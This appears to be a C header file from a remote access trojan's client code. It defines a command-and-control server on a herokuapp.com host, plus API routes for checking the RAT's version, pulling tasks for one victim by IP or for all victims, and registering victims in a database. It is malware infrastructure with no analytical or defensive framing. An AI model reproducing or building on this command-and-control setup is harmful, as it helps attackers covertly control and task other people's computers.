#pragma once
#define SERVER_HOST "http://morning-wildwood-39166.herokuapp.com"
#define API_SUB_PATH "/api/"

/*
	Routes
*/

/*
	Route POST 
	Return Actual Version of RAT
*/
#define VERSION_ROUTE "version"

/*
	Route POST
	Return tasks for this user ip address
*/
#define USER_TASK_ROUTE "user/tasks"

/*
	Route POST
	Return tasks for all users
*/
#define ALL_TASK_ROUTE "tasks"

/*
	Route POST
	Register user if not exist on database else update field "updated_at"
*/
#define USER_REGISTER_ROUTE "user/register"